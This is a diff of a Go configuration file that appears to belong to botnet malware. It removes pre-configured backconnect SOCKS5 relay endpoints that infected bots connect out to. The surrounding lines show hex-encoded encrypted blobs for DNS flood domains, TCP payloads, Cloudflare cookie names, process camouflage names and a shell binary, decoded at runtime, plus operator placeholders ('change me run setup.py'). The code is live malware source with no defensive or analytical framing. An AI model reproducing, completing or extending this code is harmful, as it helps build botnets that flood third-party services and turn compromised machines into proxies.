@@ -44,11 +44,6 @@ var proxyPass = "hGNuLxxASMxC"    //change me run setup.py
 // maxSessions caps concurrent proxy connections.
 var maxSessions int32 = 100
 
-// relayEndpoints holds pre-configured relay addresses for backconnect SOCKS5.
-// Format: "host:port" — bots connect OUT to these relays.
-// Leave empty to require explicit relay address via !socks command.
-var relayEndpoints []string
-
 // --- Misc ---
 
 // workerPool is the default number of concurrent workers.
@@ -250,9 +245,6 @@ var rawDnsFloodDomains, _ = hex.DecodeString("3b14317568405695e6ed7e9225332c1eab
 // @encrypt:single alpnH2
 var rawAlpnH2, _ = hex.DecodeString("323d18852c4d357cf96e2ee3b93b535d44f8")
 
-// @encrypt:slice relayEndpoints
-var rawRelayEndpoints, _ = hex.DecodeString("") //change me run setup.py — empty = no pre-configured relays
-
 // --- System / camouflage blobs ---
 
 // @encrypt:slice camoNames
@@ -342,11 +334,6 @@ func initRuntimeConfig() {
 	cfCookieName = string(garuda(rawCfCookieName))
 	tcpPayload = string(garuda(rawTcpPayload))
 	alpnH2 = string(garuda(rawAlpnH2))
-
-	// Relay endpoints (optional — empty blob means none configured)
-	if len(rawRelayEndpoints) > 0 {
-		relayEndpoints = strings.Split(string(garuda(rawRelayEndpoints)), "\x00")
-	}
 
 	// System / camouflage
 	shellBin = string(garuda(rawShellBin))
